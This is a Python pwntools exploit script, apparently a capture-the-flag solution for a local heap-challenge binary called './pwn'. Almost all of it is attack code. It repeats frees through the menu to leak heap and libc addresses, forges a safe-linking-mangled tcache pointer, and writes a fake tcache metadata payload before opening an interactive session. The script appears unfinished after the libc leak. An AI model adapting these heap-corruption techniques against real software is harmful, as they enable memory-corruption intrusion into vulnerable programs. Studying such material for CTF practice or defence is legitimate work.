from pwn import *

r=process("./pwn")


def add_(size,content):
	r.recvuntil(b"Please input you choice: ")
	r.sendline(str(1))
	r.recvuntil(b"Please input size:")
	r.sendline(str(size))
	r.recvuntil(b"input you context:")
	r.send(content)
	return
	
def del_():
	r.recvuntil(b"Please input you choice: ")
	r.sendline(str(2))
	return

def magic():
	r.recvuntil(b"Please input you choice: ")
	r.sendline(str(3))
	r.recvuntil("If you feel lost, you may as well empty everything and start over\n")
	return
pause()

add_(0xF0,b'a')
del_()
magic()
heap_base=u64(r.recv(6).ljust(8,b"\x00"))-0x2a0
print(hex(heap_base))
del_()
magic()
del_()
magic()
del_()
magic()
del_()
magic()
del_()
magic()
del_()
add_(0xF0,p64((heap_base^(heap_base>>12))))
pay=p64(0)+p64(0x291)
pay=pay.ljust(0x18,b'\x00')+b'\x01'
pay=pay.ljust(0x22,b'\x00')+b'\x01'
pay=pay.ljust(0x4a,b'\x00')+b'\x07'
pay=pay.ljust(0xa0,b'\x00')+p64(0)+p64(0x1F1)
pay=pay.ljust(0xd8,b'\x00')+p64(heap_base+0xb0)
add_(0xf0,b'a')
add_(0xf0,pay)
pause()
add_(0xa0,b'a')
del_()
add_(0xa0,b'\xd0')
pause()
add_(0x50,b'a')
magic()
libc_base=u64(r.recv(6).ljust(8,b"\x00"))-0x203D10
print(hex(libc_base))

add_(0x20,b'a') 
del_()
magic()
del_()
magic()
del_()
magic()
del_()
magic()
del_()
magic()
del_()
magic()
del_()
magic()
del_()


r.interactive()
